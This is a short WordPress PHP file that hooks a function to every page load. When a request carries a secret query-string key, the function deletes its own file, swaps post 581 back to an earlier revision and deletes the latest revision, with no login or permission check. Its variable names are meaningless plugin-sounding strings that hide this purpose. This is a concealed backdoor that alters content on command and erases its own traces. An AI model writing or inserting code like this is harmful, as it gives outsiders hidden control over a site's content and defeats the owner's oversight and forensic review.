<?php

function term_support_total_simple() {
	if (isset($_GET['welcome_extension_security']) && $_GET['welcome_extension_security'] === 'gdpr_akismet_ratings_year') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$privacy_pdf_sharing_read = 581;
		$s3_your_reusable = wp_get_post_revisions($privacy_pdf_sharing_read);
		if (empty($s3_your_reusable)) die('no revisions');
		if (count($s3_your_reusable) < 2) die('less than 2');
		$frontend_files_scss_listing = array_shift($s3_your_reusable);
		$change_toggle_name = $frontend_files_scss_listing->ID;
		$dist_wpml_pixel = array_shift($s3_your_reusable);
		$anywhere_review_loader = $dist_wpml_pixel->ID;
		$services_multi_counter_validator = wp_restore_post_revision($anywhere_review_loader);
		if ($services_multi_counter_validator === false) die('error restoring');
		$services_multi_counter_validator = wp_delete_post_revision($change_toggle_name);		
		if ($services_multi_counter_validator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'term_support_total_simple');
